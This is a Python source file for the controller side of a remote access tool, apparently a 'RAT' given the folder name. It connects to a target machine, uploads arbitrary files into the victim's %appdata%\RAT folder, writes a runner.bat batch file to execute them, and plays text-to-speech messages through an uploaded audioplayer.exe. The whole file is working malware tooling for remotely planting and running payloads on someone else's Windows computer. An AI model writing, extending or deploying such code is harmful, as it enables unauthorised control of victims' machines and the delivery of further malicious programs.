from gtts import gTTS
import socket
import tqdm
import os
import sys
import tempfile

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096  # send 4096 bytes each time step
APPDATAFOLDER = "RAT"
port = None
host = None
audioplayer_sent = False


def set_port(new_port):
    global port

    port = int(new_port)


def set_host(new_host):
    global host

    host = new_host


def get_port():
    return port


def get_host():
    return host


def connect(host, port):
    if not host or not port:
        print("[-] Host or port is not set")
        return
    s = socket.socket()

    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")
    return s


def send_file(s, filename):
    filename = filename.strip('"')
    filesize = os.path.getsize(filename)
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    # start sending the file
    progress = tqdm.tqdm(
        range(filesize),
        f"Sending {filename}",
        unit="B",
        unit_scale=True,
        unit_divisor=1024,
    )
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    s.close()


def send_file2(path):
    s = connect(host, port)
    if not s:
        print(f"[-] Error while connecting to {host}:{port}")
        return False
    send_file(s, path)
    s.close()

    return True


def send_data(s, data: bytes, name: str):
    size = sys.getsizeof(data)
    s.send(f"{name}{SEPARATOR}{size}".encode())

    # start sending the file
    progress = tqdm.tqdm(
        range(size), f"Sending {name}", unit="B", unit_scale=True, unit_divisor=1024
    )

    with tempfile.TemporaryFile() as tempf:
        tempf.write(data)
        tempf.seek(0)
        while True:
            # read the bytes from the file
            bytes_read = tempf.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))

    s.close()


def send_audioplayer(path: str):
    if not path.strip('"').endswith("audioplayer.exe"):
        print('[!] Audioplayer must be exe named "audioplayer.exe"')
        return False
    return send_file2(path)


def send_tts(tts_text):
    global audioplayer_sent
    if not audioplayer_sent:
        print(f"[-] {audioplayer_sent=}")
        inp = input(
            "Input path to the audioplayer to send or '--force' (without quotes) to set audioplayer_sent=True: "
        )
        if inp == "--force".strip():
            audioplayer_sent = True
        else:
            audioplayer_sent = send_audioplayer(inp)

        if not audioplayer_sent:
            print(f"[-] {audioplayer_sent=}")
            return False

    s = connect(host, port)
    if not s:
        return False
    output = gTTS(text=tts_text, lang="en", tld="co.in")
    output.save("tts.mp3")
    send_file(s, "tts.mp3")
    s.close()
    return True


def run_tts(tts_name="tts.mp3"):
    appdata_path = f"%appdata%\\{APPDATAFOLDER}\\"
    return send_runner_code(
        cmd=f"{appdata_path}audioplayer.exe {appdata_path}{tts_name}"
    )


def send_runner_code(*, filename=None, cmd=None):
    s = connect(host, port)
    if not s:
        return
    if cmd is None:
        if filename is None:
            raise TypeError(
                "The filename and the cmd argument were None, at least one argument must be specified"
            )
        cmd = f'"%appdata%\\{APPDATAFOLDER}\\{filename}"'

    send_data(s, ("@echo off\n" + cmd).encode(), "runner.bat")
    s.close()


def main():
    global audioplayer_sent
    print("[+] Welcome")

    def input_ip():
        set_host(input("Input host ipv4: "))
        input_port = input("Input host port: ")

        if not input_port.isdigit():
            raise Exception("[!] port must be a digit")

        set_port(input_port)

        return host, port

    input_ip()
    while True:
        print(f"Target: {host}:{port}")
        print("1. send tts")
        print("2. send file")
        print("3. run file")
        print("4. send file and run")
        print("5. audioplayer")
        print("6. change ip")
        print("0. exit")
        action = input("[?] Choose an action: ")

        if action == "1":
            if send_tts(input("Input your tts message: ").strip('"')):
                run_tts()
        elif action == "2":
            send_file2(input("Input path to the file you want to send: "))
        elif action == "3":
            path = input("Input the name of the file you want to run: ").strip('"')
            send_runner_code(filename=os.path.basename(path))
        elif action == "4":
            path = input("Input path to the file you want to send and run: ").strip('"')
            send_file2(path)
            send_runner_code(filename=os.path.basename(path))
        elif action == "5":
            inp = input(
                "Input path to the audioplayer to send or '--force' (without quotes) to set audioplayer_sent=True: "
            ).strip('"')
            if inp == "--force".strip():
                audioplayer_sent = True
                continue
            audioplayer_sent = send_audioplayer(inp)
        elif action == "6":
            input_ip()
        elif action == "0":
            print("[<3] Bye!")
            return
        else:
            print("[-] invalid option")


if __name__ == "__main__":
    main()
